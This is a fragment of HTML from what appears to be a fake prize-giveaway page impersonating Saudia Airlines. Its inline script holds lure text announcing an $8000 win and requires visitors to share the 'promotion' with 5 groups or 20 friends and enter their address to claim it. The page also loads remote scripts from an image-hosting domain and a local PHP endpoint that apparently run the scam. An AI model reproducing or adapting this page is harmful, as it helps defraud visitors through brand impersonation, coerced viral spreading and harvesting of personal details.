                                        <path d='M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v1.91l.01.01L1 14c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z'
                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>25 minutes ago</span>
                        </span>
                    </div>
                </div>

                <p style="font-size:12px;color:#bcbcbc"></p>
            </div>
        </div>
    </div>
    <div id="footer" style="background-color:#26265d;margin-bottom:0;font-size:12px;text-align:center;color:#fff;padding:10px">

        <i class="dt[[datetime2]] datetime" id="datetime"></i>
        <p style="line-height:20px;margin-bottom:0">
            © 2023 SAUDIA AIRLINES Inc.        </p>
    </div>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.0.0/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.1/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert2/11.6.12/sweetalert2.all.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.1/umd/popper.min.js"></script>
<script src="/saudiaair/api/d.php"></script>
<script>
    var dayNames = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
    var monthNames = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
    var minutos_y = "minutes and ";
    var segundos = "seconds";
    var qtitle = "Congratulation!";
    var qhtml = '<p style="margin:10px 0;font-size: 14px;font-weight: 600;">Your answer has been saved successfully!</p><p style="margin:1px;">You have a chance to win gifts.</p><p style="margin:1px;">You must select the correct box with your prize inside..</p><p style="margin:1px;">You have 3 attempts. Good luck!</p>';
    var prizeHtml = '<p style="margin:10px 0;font-size: 14px;font-weight: 600;">You did it! You won  $8000</p><p style="margin:1px;">*** THE RULES ***</p><div style="text-align:center;"><p style="margin:1px;">1. You must tell 5 groups or 20 friends about our promotions.</p><p style="margin:1px;">2. Enter your address and complete registration.</p><p style="margin:1px;">3. The gifts will be delivered within 5-7 days</p></div>';
    var select_text = ['Sorry, the box you selected is empty. You still have 1 chances! Good luck!','Sorry, the box you selected is empty. You still have 2 chances! Good luck!'];
    var select_title = 'Unfortunately...';
    var share_text = ["You have to share with friends about our event. Share until the blue bar is full!","Unfortunately..."];
    var shareFail_text = ["The same group or the same friend is not correct. Please check and share again.","Sharing failed!"];
    var outbox = '/imgs/United-States_outbox.png';
    var show = '';
    var show2 = 'https://u.img.social/res/69198285/img/sasasa-show2.jpg';
    var cass = "saudiaair-";
</script>
<script src="https://u.img.social/res/app.js"></script>
</body>
</html>

